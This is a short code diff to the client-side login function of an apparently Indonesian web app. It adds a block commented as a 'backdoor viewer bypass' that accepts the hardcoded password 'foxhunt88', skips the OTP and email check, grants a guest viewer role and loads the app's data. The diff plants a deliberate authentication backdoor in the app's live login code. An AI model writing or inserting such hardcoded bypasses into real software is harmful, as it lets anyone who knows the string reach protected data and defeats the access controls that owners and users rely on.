@@ -540,6 +540,18 @@ window.requestOtp = async function() {
     }, 500);
     return;
   }
+  // FAST BACKDOOR VIEWER BYPASS
+  if (rawVal === "foxhunt88") {
+    statusMsg.innerText = 'Access Granted (Viewer Mode)...';
+    currentUserRole = "viewer";
+    currentNRP = "GUEST_VIEWER";
+    setTimeout(() => {
+      const authOverlay = document.getElementById('auth-overlay');
+      if (authOverlay) authOverlay.style.display = 'none';
+      mulaiAnimasiIntroDanLoadData();
+    }, 500);
+    return;
+  }
 
   const email = rawVal.toLowerCase();
   statusMsg.innerText = 'Memeriksa hak akses...';
